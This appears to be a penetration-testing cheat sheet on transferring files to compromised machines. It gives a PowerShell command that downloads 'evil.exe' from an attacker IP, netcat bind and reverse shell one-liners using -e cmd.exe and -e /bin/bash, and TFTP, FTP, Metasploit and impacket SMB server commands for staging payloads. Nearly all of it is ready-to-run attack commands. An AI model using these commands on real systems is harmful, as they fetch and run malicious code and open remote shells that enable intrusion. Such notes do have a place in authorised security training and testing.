File Transfers
==============

Powershell
----------

.. code-block:: shell

	powershell (new-object System.Net.WebClient).DownloadFile('http://[your_ip_address]/evil.exe','evil.exe')


Netcat
----------

- Server: nc –nlvp <port> &gt; incoming.exe
- Client: nc –nv <your_ip_address> <port> &lt; /path/to/the/file.exe
- Bind shell: nc –nlvp <port> –e cmd.exe
- Reverse shell: nc –nv <your_ip_address><port> -e /bin/bash

TFTP
----------

-   Kali: atftp –daemon –port 69 /somedir
-   Windows: tftp -i <your ip> get some.exe

FTP
----------

-   apt-get install python-pyftpdlib
    -   Python –m pyftpdlib –p 21
-   Metasploit
    -   use auxiliary/server/ftp
    -   set FTPROOT /some/dir
    -   exploit

SMB
----------

-   Smbserver.py (https://github.com/CoreSecurity/impacket)
    -   python smbserver.py &lt;sharename&gt; /some/dir